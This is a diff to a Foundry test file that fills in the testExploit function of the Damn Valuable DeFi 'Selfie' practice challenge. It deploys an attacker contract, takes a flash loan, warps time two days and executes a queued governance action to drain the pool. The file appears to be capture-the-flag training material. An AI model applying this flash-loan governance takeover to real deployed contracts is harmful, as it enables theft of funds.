@@ -6,6 +6,8 @@ import "forge-std/Test.sol";
 
 import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
+import {Attacker} from "../../../src/Contracts/selfie/attack.sol";
+
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
 
 contract Selfie is Test {
@@ -45,6 +47,16 @@ contract Selfie is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        Attacker att = new Attacker(
+            address(selfiePool),
+            address(simpleGovernance),
+            address(dvtSnapshot)
+        );
+        att.takeFlashloan();
+        vm.warp(block.timestamp + 2 days);
+        simpleGovernance.executeAction(1);
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
